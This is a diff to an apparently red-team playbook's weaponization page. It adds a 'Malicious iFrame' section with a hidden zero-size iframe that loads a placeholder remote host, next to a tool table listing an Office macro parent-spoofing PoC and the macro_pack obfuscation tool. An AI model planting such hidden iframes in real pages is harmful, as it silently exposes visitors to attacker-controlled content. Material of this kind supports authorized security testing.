@@ -3,6 +3,7 @@
 ## Table of Contents
 
 - [Tooling](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/2-Weaponization/2-Weaponization.md#Tooling)
+- [Malicious iFrame](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/2-Weaponization/2-Weaponization.md#Malicious-iFrame)
 - [macro_pack](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/2-Weaponization/2-Weaponization.md#macro_pack)
 
 ## Tooling
@@ -11,6 +12,12 @@
 | --- | --- | --- |
 | spoofing-office-macro | PoC of a VBA macro spawning a process with a spoofed parent and command line. | https://github.com/christophetd/spoofing-office-macro |
 | macro_pack | macro_pack is a tool by @EmericNasi used to automatize obfuscation and generation of Office documents, VB scripts, shortcuts, and other formats for pentest, demo, and social engineering assessments. | https://github.com/sevagas/macro_pack |
+
+## Malicious iFrame
+
+```c
+<iframe src="<RHOST>" width="0" height="0" frameborder="0" tabindex="-1" title="empty" style=visibility:hidden;display:none"></iframe>
+```
 
 ## macro_pack
 
